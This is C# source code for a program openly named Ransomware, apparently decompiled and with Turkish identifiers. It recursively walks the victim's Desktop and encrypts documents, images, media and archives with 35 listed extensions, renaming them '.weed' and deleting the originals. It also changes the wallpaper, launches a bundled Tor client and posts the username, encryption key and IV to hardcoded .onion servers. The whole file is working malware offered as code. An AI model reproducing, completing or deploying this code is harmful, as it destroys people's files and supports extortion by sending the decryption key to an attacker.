using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using Ransomware.SistemFonk;
using ns0;

namespace Ransomware;

internal class Program
{
	private static string[] dosyalar = new string[11]
	{
		"libcrypto-1_1.dll", "libevent-2-1-7.dll", "libevent_core-2-1-7.dll", "libevent_extra-2-1-7.dll", "libgcc_s_sjlj-1.dll", "libssl-1_1.dll", "libssp-0.dll", "libwinpthread-1.dll", "zlib1.dll", "tor.exe",
		"wallpaper.jpg"
	};

	private static string[] uzantilar = new string[35]
	{
		".txt", ".xls", ".xlsx", ".ppt", ".pptx", ".mdb", ".mdbx", ".avi", ".mp3", ".mp4",
		".mkv", ".mkv", ".wmv", ".flv", ".3gp", ".dat", ".mov", ".ogg", ".wav", ".mid",
		".jpeg", ".jpg", ".bmp", ".psd", ".gif", ".pdf", ".rar", ".zip", ".tar", ".7z",
		".odt", ".ott", ".rtf", ".uot", ".dic"
	};

	private static void TorDosyalariCikart(string yol)
	{
		Directory.CreateDirectory(yol + "\\Tor");
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string name = executingAssembly.GetName().Name;
		string[] array = dosyalar;
		foreach (string text in array)
		{
			Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name + "." + text);
			FileStream fileStream = new FileStream(yol + "\\Tor\\" + text, FileMode.Create, FileAccess.Write);
			manifestResourceStream.CopyTo(fileStream);
			manifestResourceStream.Close();
			fileStream.Close();
		}
	}

	private static IEnumerable<string> DosyalariCikart(string yol)
	{
		string[] dosyalar = Directory.GetFiles(yol);
		string[] klasorler = Directory.GetDirectories(yol);
		string[] array = dosyalar;
		for (int i = 0; i < array.Length; i++)
		{
			yield return array[i];
		}
		string[] array2 = klasorler;
		foreach (string klasor in array2)
		{
			foreach (string item in DosyalariCikart(klasor))
			{
				yield return item;
			}
		}
	}

	private static Dictionary<string, string> KeyOlustur(string kombinasyon)
	{
		Random rndm = new Random();
		string value = new string((from s in Enumerable.Repeat(kombinasyon, 16)
			select s[rndm.Next(s.Length)]).ToArray());
		string value2 = new string((from s in Enumerable.Repeat(kombinasyon, 16)
			select s[rndm.Next(s.Length)]).ToArray());
		return new Dictionary<string, string>
		{
			{ "key", value },
			{ "iv", value2 }
		};
	}

	private static Socket TorBaglan(string hiddenservice, short hiddenservice_port)
	{
		ISOCKS iSOCKS = new SOCKS5("127.0.0.1", 9050);
		return iSOCKS.SOCKSBaglan(hiddenservice, hiddenservice_port);
	}

	private static void Main(string[] args)
	{
		Dictionary<string, string> dictionary = KeyOlustur("ABCDEFGHJIJKLMNOPRSTUVYZabcdefghijklmnoprstuvyz0123456789");
		DosyaSifreleyici dosyaSifreleyici = new DosyaSifreleyici(dictionary["key"], Encoding.Default.GetBytes(dictionary["iv"]));
		API.EkranDurumu(durum: true);
		string yol = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Tor\\wallpaper.jpg";
		API.ArkaplanDegistir(yol);
		string[] array = new string[2]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal)
		};
		for (int i = 0; i < array.Length; i++)
		{
			foreach (string item in DosyalariCikart(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
			{
				if (uzantilar.Contains<string>(Path.GetExtension(item)))
				{
					try
					{
						dosyaSifreleyici.Sifrele(item, ".weed");
						File.Delete(item);
					}
					catch
					{
					}
				}
			}
		}
		TorDosyalariCikart(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Tor\\tor.exe");
		string hiddenservice = "fyxfedr2nb2y4jktcusu5p6yjlgex2uibr3napu6jb5rmn6mbxkzyxqd.onion";
		Socket socket = TorBaglan(hiddenservice, 80);
		string text = "pc_ismi=" + Environment.UserName + "&_key=" + dictionary["key"] + "&iv=" + dictionary["iv"];
		string text2 = "POST /log.php HTTP/1.1";
		text2 += "\r\n";
		text2 += "User-Agent: Mozilla/5.0";
		text2 += "\r\n";
		text2 += "Host: 73s6inpk5qkmi3ta3kgmoimjetwkzrtv6zpww2xrxideg5xmbpnigqad.onion";
		text2 += "\r\n";
		text2 += "Content-Type: application/x-www-form-urlencoded";
		text2 += "\r\n";
		text2 = text2 + "Content-Length: " + text.Length;
		text2 += "\r\n\r\n";
		text2 += text;
		socket.Send(Encoding.Default.GetBytes(text2));
		byte[] buffer = new byte[4096];
		socket.Receive(buffer);
	}
}
